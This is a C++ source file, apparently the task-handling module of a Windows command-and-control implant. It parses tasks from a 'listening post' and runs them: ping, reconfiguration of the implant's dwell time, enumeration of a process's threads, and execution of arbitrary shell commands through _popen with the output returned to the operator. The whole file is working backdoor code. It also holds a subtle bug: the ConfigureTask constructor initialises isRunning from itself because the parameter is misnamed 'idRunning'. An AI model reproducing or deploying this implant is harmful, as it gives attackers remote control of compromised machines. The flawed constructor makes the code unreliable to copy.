#ifdef _WIN32
#define WIN32_LEAN_AND_MEAN
#endif

#include "tasks.h"

#include <string>
#include <array>
#include <sstream>
#include <fstream>
#include <cstdlib>

#include <boost/uuid/uuid_io.hpp>
#include <boost/property_tree/ptree.hpp>

#include <Windows.h>
#include <tlhelp32.h>

// Function to parse the tasks from the property tree returned by the listening post
// Execute each task according to the key specified (e.g. Got task_type of "ping"? Run the PingTask)
[[nodiscard]] Task parseTaskFrom(const boost::property_tree::ptree& taskTree,
    std::function<void(const Configuration&)> setter){
        // Get the task type and identifier, declare our variables
        const auto taskType = taskTree.get_child("task_type").get_value<std::string>();
        const auto idString = taskTree.get_child("task_id").get_value<std::string>();
        std::stringstream idStringStream{ idString };
        boost::uuids::uuid id{};
        idStringStream >> id;

    // Conditionals to determine which task should be executed based on key provided
    // REMEMBER: Any new tasks must be added to the conditional check, along with arg values
    // ===========================================================================================
        if (taskType == PingTask::key){
            return PingTask{
                id
            };
        }
        if(taskType == ConfigureTask::key){
            return ConfigureTask{
                id,
                taskTree.get_child("dwell").get_value<double>(),
                taskTree.get_child("running").get_value<bool>(),
                std::move(setter)
            };
        }
        if (taskType == ExecuteTask::key){
            return ExecuteTask{
                id,
                taskTree.get_child("command").get_value<std::string>()
            };
        }
        if (taskType == ListThreadsTask::key){
            return ListThreadsTask{
                id,
                taskTree.get_child("procid").get_value<std::string>()
            };
        }
        // No conditionals matched, so an undefined task type must have been provided and we error out
        std::string errorMsg{ "Illegal task type encountered:" };
        errorMsg.append(taskType);
        throw std::logic_error{ errorMsg };
    }

// ================PingTask============================
//defining the constructor,instantiates the "id" variable
PingTask::PingTask(const boost::uuids::uuid& id)
    : id{ id } {}

//actions that the task will perform within the "run" method
Result PingTask::run() const {
    const auto pingResult = "PONG!";
    return Result{ id, pingResult,true };
}

// ================ConfigureTask============================
// Instantiate a Configuration object
// which is the implant configuration
Configuration::Configuration(const double meanDwell,const bool isRunning)
    : meanDwell(meanDwell), isRunning(isRunning) {}

// Configure task object constructor
ConfigureTask::ConfigureTask(const boost::uuids::uuid& id,
    double meanDwell,
    bool idRunning,
    std::function<void(const Configuration&)> setter)
    : id{ id },
    meanDwell{ meanDwell },
    isRunning{isRunning},
    setter{std::move(setter)}{}

// The Configure "run" method will call the setter to define the
// mean dwell time and running status for the implant configuration
Result ConfigureTask::run() const {
    // Call setter to set the implant configuration, mean dwell time and running status
    setter(Configuration{ meanDwell,isRunning});
    return Result{id, "Configuration successful!",true};
} 


// ================ExecuteTask============================
ExecuteTask::ExecuteTask(const boost::uuids::uuid& id, std::string command )
    :id {id},
    command{std::move(command)}{}

Result ExecuteTask::run() const{
    std::string result;
    // try to run a command
    try{
        //having a buffer declared
        std::array<char,128> buffer{};
        //getting a pointer to a pipe where we pass in the 
        //command string to "_popen()" and then calling "_pclose()"
        std::unique_ptr<FILE,decltype(&_pclose)> pipe{
            _popen(command.c_str(),"r"),
            _pclose
        };
        //If we failed to get a pointer to a pipe
        if(!pipe){
            throw std::runtime_error("Failed to open pipe.");
        }
        //reads in the results of the command into our buffer
        //We store the buffer into a "result" variable and pass this 
        //into the Result object that we return to the calling function
        while(fgets(buffer.data(),buffer.size(),pipe.get())!=nullptr){
            result += buffer.data();
        }
        return Result{id , std::move(result),true};
    }catch(const std::exception& e){
        return Result{id , e.what(),false};
    }
}

// ================ListThreadsTask============================
ListThreadsTask::ListThreadsTask(const boost::uuids::uuid& id,std::string processId)
    :id {id},
    processId {processId} {}

Result ListThreadsTask::run() const {
    try{
        std::stringstream threadList;
        auto ownerProcessId {0};

        // User wants to list threads in current process
        if(processId == "-"){
            ownerProcessId = GetCurrentProcessId();
        }

        // If the process ID is not blank, try to use it for listing the threads in the process
        else if (processId!= ""){
            //stoi = string to int
            ownerProcessId = stoi(processId);
        }

        // Some invalid process ID was provided, throw an error
        else{
            return Result{id,"Error! Failed to handle given process ID.",false};
        }

        // Take a snapshot of all running threads
        HANDLE threadSnap = INVALID_HANDLE_VALUE;
        THREADENTRY32 te32;

         // Fill in the size of the structure before using it. 
        threadSnap = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD,0);
        if (threadSnap == INVALID_HANDLE_VALUE)
            return Result{ id,"Error! Could not take a snapshot of all running threads.", false};
        
        te32.dwSize = sizeof(THREADENTRY32);

        // Retrieve information about the first thread,
        // and exit if unsuccessful
        if(!Thread32First(threadSnap, &te32)){
            // Must clean up the snapshot object!
            CloseHandle(threadSnap);
            return Result{ id ,"Error! Could not retrieve information about first thread.",false };
        }

        // Now walk the thread list of the system,
        // and display information about each thread
        // associated with the specified process
        do{
            if (te32.th32OwnerProcessID == ownerProcessId){
                // Add all thread IDs to a string stream
                threadList << "THREAD ID     =" << te32.th32ThreadID << "\n";
            }
        } while (Thread32Next(threadSnap, &te32));

        //  Don't forget to clean up the snapshot object.
        CloseHandle(threadSnap);
        
        // Return string stream of thread IDs
        return Result{ id , threadList.str(),true};
    }
    catch (const std::exception& e){
        return Result {id, e.what(),false};
    }
}